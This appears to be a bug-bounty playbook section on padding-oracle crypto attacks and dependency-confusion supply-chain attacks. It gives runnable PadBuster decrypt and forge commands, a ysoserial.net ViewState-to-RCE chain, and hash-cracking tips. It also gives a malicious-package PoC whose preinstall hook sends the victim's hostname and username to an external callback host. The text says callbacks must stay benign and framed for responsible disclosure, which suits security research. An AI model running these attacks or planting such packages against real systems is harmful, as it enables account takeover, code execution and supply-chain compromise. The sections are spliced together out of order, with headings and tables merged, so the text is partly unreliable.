## 26. PADDING ORACLE & CRYPTO MISUSE
> Apps encrypt session data, settings, or state into cookies / hidden fields / URL params to make them tamper-proof. When the **decryption** path leaks whether padding is valid (via differential responses), an attacker without the key can decrypt **and forge** arbitrary plaintexts. ASP.NET ViewState, Rails session cookies, and home-grown CBC-encrypted cookies remain common targets. Also covers ECB block-repetition and weak-hash quick-wins.

### Identifying Padding Oracle Candidates
| Signal | What it means |
|---|---|
| Cookie / token is base64 or hex, decoded length is multiple of 8 or 16 | CBC mode candidate |
| `__VIEWSTATE` hidden field in form | ASP.NET — classic padding-oracle / ViewState-forgery target |
| Rails <= 4.0 `_app_session` cookie not signed-then-encrypted | Padding oracle candidate (CVE-2013-0156 lineage) |
| Java JEE `JSESSIONID` longer than usual (>64 chars base64) | Some app servers encrypt session — test for oracle |
| Custom `auth=...`, `state=...`, `data=...` opaque blobs | Always worth probing |

### Response-Signal Triangulation (1-byte flip test)
Flip the last byte of the ciphertext and watch response:

```
500 Internal Server Error  =  STRONG signal — app leaks padding error directly
401/403 + different body length than normal "wrong creds"  =  Possible — diff-based oracle
200 + same body  =  Not exploitable (or oracle is timing-based, much slower attack)
```

### Mechanics (one-paragraph version)
CBC decryption: `plaintext_block_n = decrypt(ciphertext_block_n) XOR ciphertext_block_{n-1}`. By **mutating block_{n-1}** one byte at a time and observing whether padding validates on `block_n`, an attacker recovers `decrypt(block_n)` byte-by-byte (256 tries per byte; 16 bytes per block = ~4096 requests). Same primitive lets you **forge** any plaintext: given known mapping for one block, compute the ciphertext that decrypts to your target.

### PadBuster — Decrypt and Forge

```bash
# Install
gem install padbuster
# or: git clone https://github.com/AonCyberLabs/PadBuster && cd PadBuster

# DECRYPT mode — recover plaintext of a cookie
padbuster https://target.com/page CIPHERTEXT 16 \
  --cookies "auth=CIPHERTEXT" \
  --encoding 0    # 0=base64, 1=lower hex, 2=upper hex, 3=base64+url-safe

# ENCRYPT mode — forge ciphertext for a chosen plaintext
padbuster https://target.com/page CIPHERTEXT 16 \
  --cookies "auth=CIPHERTEXT" \
  --plaintext "user=admin&role=root"
```

Switches that matter when the oracle is noisy:
- `-error "Internal Server Error"` — explicit signature string for "bad padding"
- `--prefix "known_block"` — if you know a leading plaintext block, anchor against it
- `--no-iv` — when IV is part of the cookie (some implementations strip it)

### ASP.NET ViewState — Padding Oracle to RCE Chain (CVE-2010-3332 lineage)
The crown-jewel target. If `__VIEWSTATE` validation/decryption is CBC and leaks padding errors, the chain is:

```
1. Capture __VIEWSTATE from any page (form hidden field, view-source)
2. Run PadBuster against the page that processes the postback -> recover machineKey-equivalent oracle
3. Use ysoserial.net to build a ViewState payload that triggers .NET deserialization gadget:
     ysoserial.exe -p ViewState -g TextFormattingRunProperties \
       -c "powershell ..." --decrypt KEY --validationkey KEY \
       --validationalg HMACSHA256 --decryptionalg AES
4. Submit forged __VIEWSTATE in POST -> RCE under app pool identity
```

Cheaper variant when machineKey is leaked elsewhere (web.config exposure via path traversal, `/elmah.axd`, `/trace.axd`, `.git/` exposure): skip PadBuster, jump straight to ysoserial.net.

### Bonus — Weak Crypto Quick Wins (no padding oracle needed)

```
ECB mode detection
  Encrypt repeated plaintext: AAAAAAAAAAAAAAAAAAAAAAAAAAAA (32 A's, two 16-byte blocks)
  If ciphertext blocks are IDENTICAL bytes -> ECB confirmed -> block-swap / replay attacks viable

Weak password hash
  hashid <hash>  ->  identifies algorithm (MD5/SHA1/bcrypt/etc.)
  MD5/SHA1 unsalted + leaked user table -> crackstation.net / hashcat -m 0 / -m 100

"Base64 as encryption"
  Cookie that decodes via base64 to readable JSON / key=value pairs = no actual encryption
  Modify the plaintext, re-encode, submit -> privilege change with zero cryptanalysis

Static IV / Reused nonce (CBC or GCM)
  Two ciphertexts of equal length with byte-identical leading blocks -> likely static IV
  Allows known-plaintext attacks and bit-flipping on the first block
```

### Chains That Pay
```
Padding oracle on session cookie -> decrypt -> forge admin cookie               Critical (ATO)
ViewState padding oracle -> ysoserial.net deserialization gadget -> RCE         Critical
Padding oracle on opaque state param -> tampered state survives integrity check Medium/High
ECB block-swap on encrypted cookie -> role escalation                           High
Weak hash + small user table leak -> password recovery                          High
"Base64 as encryption" cookie -> tamper plaintext -> privilege change           High
Padding oracle confirmed, no forge path applicable (read-only data)             Medium (info disclosure)
Padding oracle suspected but only timing differential (no status/length diff)   Low/Info (chain only)

# VULNERABLE — internal pkg "acme-auth-utils" lives only on the private registry,
# but the resolver also checks public npm. Attacker publishes acme-auth-utils@99.0.0
# to public npm → resolver sees 99.0.0 > internal 1.4.2 → installs the attacker's.
npm install            # no scope, no lockfile pin, registry fallback enabled

# SECURE — scoped name bound to a registry; attacker can't publish under the scope
# @acme/auth-utils  +  .npmrc: @acme:registry=https://npm.internal.acme.com
# pip: --require-hashes   Maven: <checksumPolicy>fail</checksumPolicy>   Go: committed go.sum + -mod=readonly
```

### Detection — Step 1: harvest internal package names
The whole attack starts with a name the org uses internally but hasn't reserved publicly. Where they leak:

```bash
# (1) Leaked package.json / lockfiles in public GitHub repos & gists
# GitHub code search (web or gh): find dependency blocks referencing the org
#   "dependencies" "acme-" filename:package.json
#   filename:package-lock.json acme       filename:yarn.lock @acme
#   filename:requirements.txt acme        filename:Gemfile acme   filename:pom.xml acme

# (2) JS bundles on the org's own sites — the most reliable source (recon already has these)
#     require('internal-pkg') / import survives bundling; webpack chunk comments leak names
grep -rhoE "require\(['\"][@a-z0-9._/-]+['\"]\)" recon/$TARGET/js/ | sort -u
grep -rhoE "from ['\"]@[a-z0-9-]+/[a-z0-9._-]+['\"]" recon/$TARGET/js/ | sort -u   # scoped imports
# Webpack/Vite source maps map minified back to original module paths:
grep -rhoE '"[@a-z0-9._/-]+"' recon/$TARGET/js/*.map 2>/dev/null | grep -iE "$ORGKEYWORD" | sort -u

# (3) .npmrc / .pip.conf / .gemrc / settings.xml referencing an internal registry host
#     (these confirm a private registry EXISTS — i.e. the fallback condition is plausible)
grep -rniE "registry=|index-url|@[a-z]+:registry|nexus|artifactory|verdaccio|packagecloud" recon/$TARGET/

# (4) Error messages / 404s — an internal registry 404 or a stack trace naming a module
#     "Cannot find module 'acme-internal-sdk'"  /  "No matching distribution found for acme-..."
```

```
Other leak spots worth a look:
  Dockerfile / docker-compose       COPY .npmrc, RUN npm i acme-internal
  CI configs                        .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile (npm/pip install lines)
  Public Postman/Swagger/SDK docs   sample "npm install @acme/..." snippets
  source-map module paths           webpack:///./node_modules/acme-... in *.js.map
```

### Detection — Step 2: confirm the name is UNCLAIMED on the public registry
This is the **kill switch**. If the public registry already serves that name, it's N/A — either the org owns it (safe) or someone else does (out of your hands).

```bash
# npm  — 404 / "is not in this registry" = claimable; any result = STOP, already taken
npm view acme-auth-utils            # E404 → unclaimed
# pip  — no matching distribution = claimable
pip index versions acme-internal-sdk 2>&1 | grep -i "no matching\|not found"
# RubyGems
gem list -r acme_internal           # empty = claimable
# Maven Central — check the groupId/artifactId path resolves
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://repo1.maven.org/maven2/com/acme/internal-lib/"   # 404 = not on Central
```

> **Only proceed if BOTH are true: (a) name is used internally, (b) name is unclaimed on the public registry the org's build can reach.** Speculative "they might pull from public" with no evidence the build does so is N/A on most programs.

### The Responsible-Disclosure PoC — CALLBACK ONLY, NEVER A PAYLOAD
Publish a **benign placeholder** whose only job is to fire a DNS/HTTP beacon proving execution on the org's infra. This is the single most important boundary in this skill.

```json
// package.json — npm. The scripts hook runs on `npm install`.
{
  "name": "acme-auth-utils",
  "version": "99.0.0",                 // higher than internal so the resolver prefers it
  "description": "bug bounty PoC placeholder — contact security@yourhandle, see README",
  "scripts": {
    "preinstall": "node beacon.js"     // preinstall fires even if install later aborts
  }
}
```

```js
// beacon.js — the ONLY thing it does: one DNS/HTTP callback proving "code ran here".
// PERMITTED: hostname + whoami + cwd, ONLY to prove a real corporate host (not a registry
// scanner) ran it, and ONLY if the program's policy doesn't forbid host metadata.
// FORBIDDEN: reverse shell, reading files, dumping env/secrets, persistence, lateral movement,
//            anything beyond proving execution. A real payload turns a bounty into a CFAA problem.
const os = require('os');
const id = `${os.hostname()}.${require('os').userInfo().username}`.replace(/[^a-z0-9.-]/gi,'-');
// DNS callback — survives egress-filtered corp networks (Birsan's choice). Use a logging DNS host:
require('dns').lookup(`${id}.YOURID.oast.fun`, () => {});      // interactsh / Burp Collaborator / dnsbin
// Optional HTTP callback as a second signal (only if egress allows):
try { require('https').get(`https://YOURID.oast.fun/?h=${id}`, () => {}); } catch (e) {}
```

```bash
# Publish, then WAIT for a callback from THEIR network. Do not report before it fires.
npm publish                          # PyPI: python -m build && twine upload ; gem build && gem push
# When a hit lands, confirm it's the TARGET, not an automated registry scanner:
#   - ARIN/whois the source IP → does it belong to the org / their cloud account?
#   - hostname pattern matches their naming? cwd looks like a CI runner / dev box?
# Then UNPUBLISH / deprecate immediately and report. Leaving a higher version live is a DoS.
npm unpublish acme-auth-utils@99.0.0
```

> **Submission rule:** a confirmed callback **from the target's infrastructure** = real RCE-class impact, payable. A callback only from npm's/PyPI's own crawler infra = N/A false positive. No callback at all = N/A. Many hunters report prematurely and get closed Informative; wait for the genuine hit.

### Variants by ecosystem

| Ecosystem | Execution hook | Where names leak | Confirm unclaimed |
|---|---|---|---|
| **npm / yarn / pnpm** | `preinstall`/`postinstall` script | `package.json`, lockfiles, JS bundle `require()`, `.npmrc` | `npm view <name>` → E404 |
| **pip / PyPI** | `setup.py` runs on install (`cmdclass`/`install`) | `requirements.txt`, `setup.py`, `pyproject.toml`, `.pip/pip.conf` `index-url` | `pip index versions <name>` |
| **Maven / Gradle** | no install hook — confusion = build pulls poisoned artifact | `pom.xml` groupId/artifactId, `settings.xml` (Nexus/Artifactory repo) | Maven Central path 404 |
| **RubyGems** | `extconf.rb` / gemspec native-ext build step | `Gemfile`, `*.gemspec`, `.gemrc` source list | `gem list -r <name>` empty |
| **NuGet / Go** | NuGet: install scripts; Go: build-time only | `*.csproj`, `nuget.config`; `go.mod` (less exploitable — proxy + go.sum) | registry lookup 404 |

> **Scoped-name nuance (npm):** `@acme/auth-utils` is NOT confusable unless the scope `@acme` is **unregistered** on public npm — then an attacker can register the scope and publish under it. Unscoped names (`acme-auth-utils`) are the classic, easier case. Check whether the scope itself is claimable.

### Scope Caveats — what's submittable vs N/A
```
Confirmed callback FROM target infra (ARIN-verified)          = High/Critical (RCE-class) — submit
Internal name unclaimed + private registry confirmed,         = Low/Info, often N/A — "speculative, no
  but NO callback / can't prove their build pulls public         proof of execution" closes it
Internal name already on public npm/PyPI (org or 3rd-party)   = N/A (not exploitable by you)
Org pins all deps to scope/lockfile-with-integrity/hashes     = N/A (resolver can't be confused)
Internal package NEVER published publicly + program says      = N/A (Facebook-style rejection: not in scope)
  that's required
Typosquat (similar name, not exact internal name)             = usually N/A on BBPs — low signal, treat as separate
```

> **Per-program reality:** Netflix marks shared-root-cause dep-confusion reports as Duplicate but accepts clear evidence of execution from infra. Facebook rejected a report where the internal package was never on npmjs.com. Always read the program's supply-chain policy before publishing anything — and never publish a package the program hasn't put package registries in scope for.

### Real Paid Examples
- **$130,000+** — Alex Birsan's 2021 research across 35 companies (Apple, Microsoft, PayPal, Netflix, Uber, Tesla, Yelp, Shopify); DNS-callback PoCs only, 200+ benign packages on npm/PyPI/RubyGems
- **$5,000** — RCE via dependency confusion, callback proving execution (username/hostname/cwd), HackerOne writeup
- **$2,500** — RCE via an unclaimed Node package pulled into a target's build (HackerOne writeup)
- pattern seen on HackerOne — Sifchain disclosed dependency-confusion report (public disclosure #1187816)
- Still active in 2026: Microsoft Security documented 33 malicious npm packages abusing dependency confusion to profile developer environments (May 2026) — proves the resolver flaw persists at scale

### Chains That Pay
```
Leaked package.json on GitHub -> unclaimed name -> callback PoC fires from CI       Critical (RCE on build infra)
JS bundle require('internal') -> unclaimed -> callback from dev laptop              High/Critical
.npmrc internal-registry ref -> confirms fallback config -> confusion confirmed     supports the chain
Callback proves exec -> (DO NOT escalate to real RCE) -> report exec proof only     Critical, stays ethical
Internal name found but already public / fully pinned                               N/A — kill it, move on
```

### Triage
```
1-byte flip on cookie -> 500, PadBuster confirms decryption/forge end-to-end    Critical
ViewState padding oracle + ysoserial RCE PoC                                    Critical
ECB block repetition detected + structured data + working swap attack           High
Weak hash + actual password recovery in PoC                                     High
"Base64 as encryption" + working privilege change PoC                           High
Crypto oracle suspected but no working tamper/decrypt PoC                       N/A (chain only)
Callback fired from target-owned IP (ARIN-verified) + name was unclaimed   = Critical/High — RCE-class, submit
Callback fired but only from registry-scanner IP                           = N/A (false positive)
Name unclaimed + private registry config proven, no callback yet           = wait; premature report = Informative
Name already claimed on public registry                                    = N/A (not exploitable)
Deps fully scoped + lockfile integrity + hash-pinned                       = N/A (not confusable)
Real payload used instead of a benign callback                             = STOP — do not submit, legal/ethical breach

```

---

